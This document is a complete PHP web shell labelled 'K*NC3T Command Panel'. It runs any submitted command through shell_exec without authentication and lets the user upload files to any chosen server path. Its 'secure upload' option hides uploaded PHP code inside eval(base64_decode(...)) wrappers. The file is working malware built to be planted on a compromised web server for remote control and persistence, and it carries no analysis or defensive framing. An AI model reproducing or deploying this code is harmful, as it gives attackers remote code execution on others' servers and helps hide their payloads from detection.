<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>K*NC3T Command Panel</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet" />
  <style>
    body {
      background-color: #0d0d0d;
      color: #00ff99;
      font-family: 'Share Tech Mono', monospace;
      padding: 40px;
    }
    h1 { text-align: center; font-size: 28px; margin-bottom: 40px; }
    form, .box, .uploader {
      max-width: 600px;
      margin: 20px auto;
      background: #111;
      padding: 20px;
      border: 2px solid #00ff99;
      border-radius: 8px;
    }
    input[type="text"], button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      background: #0f0f0f;
      color: #00ff99;
      border: 1px solid #00ff99;
      border-radius: 4px;
      font-size: 16px;
      box-sizing: border-box;
    }
    button:hover { background: #00ff99; color: #0f0f0f; cursor: pointer; }
    label { font-weight: bold; display: block; margin-top: 15px; }
    pre {
      background-color: #000;
      padding: 10px;
      border-radius: 5px;
      color: #00ff99;
      overflow-x: auto;
      white-space: pre-wrap;
      word-wrap: break-word;
    }
    .uploader {
      text-align: center;
      cursor: pointer;
      position: relative;
      transition: background-color 0.3s ease;
      user-select: none;
      margin-top: 10px;
      border: 2px dashed #00ff99;
      padding: 40px 20px;
    }
    .uploader.dragover { background-color: #003300; border-color: #00ff99; }
    .uploader p { margin: 0; font-size: 18px; }
    #fileInput { display: none; }
    label.file-label {
      display: inline-block;
      background: #0f0f0f;
      border: 1px solid #00ff99;
      padding: 10px 15px;
      margin-top: 10px;
      border-radius: 4px;
      color: #00ff99;
      cursor: pointer;
      font-size: 16px;
      user-select: none;
    }
    #progressContainer {
      margin-top: 15px;
      height: 20px;
      width: 100%;
      background: #222;
      border-radius: 10px;
      overflow: hidden;
      display: none;
    }
    #progressBar {
      height: 100%;
      width: 0;
      background-color: #00ff99;
      transition: width 0.3s ease;
    }
    #uploadStatus { margin-top: 10px; font-size: 14px; min-height: 20px; }
  </style>
</head>
<body>
  <h1>Command Execution K*NC3T</h1>

  <form method="POST" id="cmdForm" autocomplete="off">
    <label for="cmd">Enter Command</label>
    <input type="text" name="cmd" id="cmd" placeholder="whoami" />
    <button type="submit">Run Command</button>
  </form>

  <?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd']) && empty($_FILES)) {
      $cmd = $_POST['cmd'];
      $output = shell_exec($cmd . ' 2>&1');
      echo '<div class="box">';
      echo "<h2>Output:</h2><pre>" . htmlspecialchars($output) . "</pre>";
      echo '</div>';
  }

  if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploaded_file'])) {
      $secure = isset($_POST['secure_upload']) && $_POST['secure_upload'] === 'true';
      $uploadDir = !empty($_POST['upload_path']) ? rtrim($_POST['upload_path'], '/\\') : __DIR__;

      $filename = basename($_FILES['uploaded_file']['name']);


      function makeUrl($filePath) {
          $documentRoot = realpath($_SERVER['DOCUMENT_ROOT']);
          $realUpload   = realpath($filePath);
          if ($realUpload && strpos($realUpload, $documentRoot) === 0) {
              $relativePath = str_replace('\\', '/', substr($realUpload, strlen($documentRoot)));
              return (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https://' : 'http://') .
                     $_SERVER['HTTP_HOST'] . $relativePath;
          }
          return false;
      }

      if (!$secure) {
          $targetPath = $uploadDir . '/' . $filename;
          if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $targetPath)) {
              $fullUrl = makeUrl($targetPath);
              echo "<div class='box'><strong>✅ Upload Success!</strong><br>";
              echo "📁 Saved to: <pre>$targetPath</pre><br>";
              if ($fullUrl) {
                  echo "🌐 Access URL: <a href='$fullUrl' target='_blank'>$fullUrl</a>";
              } else {
                  echo "🌐 File is outside web root (no public URL)";
              }
              echo "</div>";
          } else {
              echo "<div class='box' style='color:#ff4444;'><strong>❌ Upload Failed!</strong></div>";
          }
      } else {
          $content = file_get_contents($_FILES['uploaded_file']['tmp_name']);
          $encoded = base64_encode($content);

          $encodedFilename = pathinfo($filename, PATHINFO_FILENAME) . '_encoded.php';
          $encodedPath = $uploadDir . '/' . $encodedFilename;

          $wrapper = "<?php\n// Secure encoded PHP file\neval(base64_decode('" . $encoded . "'));";

          if (file_put_contents($encodedPath, $wrapper) !== false) {
              $fullUrl = makeUrl($encodedPath);
              echo "<div class='box'><strong>✅ Secure Upload Success!</strong><br>";
              echo "📁 Saved to: <pre>$encodedPath</pre><br>";
              if ($fullUrl) {
                  echo "🌐 Access URL: <a href='$fullUrl' target='_blank'>$fullUrl</a><br>";
              } else {
                  echo "🌐 File is outside web root (no public URL)";
              }
              echo "⚠️ cat read source</div>";
          } else {
              echo "<div class='box' style='color:#ff4444;'><strong>❌ Secure Upload Failed!</strong></div>";
          }
      }
  }
  ?>

  <div class="uploader" id="uploader">
    <p>Drag & Drop files here or click the button below to select files</p>
    <form id="uploadForm" method="POST" enctype="multipart/form-data">
      <label for="fileInput" class="file-label">Select File</label>
      <input type="file" id="fileInput" name="uploaded_file" />

      <label for="uploadPath">Upload Path (optional)</label>
      <input type="text" id="uploadPath" name="upload_path" placeholder="/var/www/html/uploads" />

      <label>
        <input type="checkbox" id="secureUploadCheckbox" name="secure_upload" value="true" />
        Secure Upload (Encode PHP files)
      </label>

      <button type="submit" style="margin-top:10px;">Upload File</button>
    </form>
  </div>

  <script>
    const uploader = document.getElementById('uploader');
    const fileInput = document.getElementById('fileInput');

    uploader.addEventListener('dragover', (e) => {
      e.preventDefault();
      uploader.classList.add('dragover');
    });
    uploader.addEventListener('dragleave', () => {
      uploader.classList.remove('dragover');
    });
    uploader.addEventListener('drop', (e) => {
      e.preventDefault();
      uploader.classList.remove('dragover');
      if(e.dataTransfer.files.length) {
        fileInput.files = e.dataTransfer.files;
      }
    });
  </script>
</body>
</html>
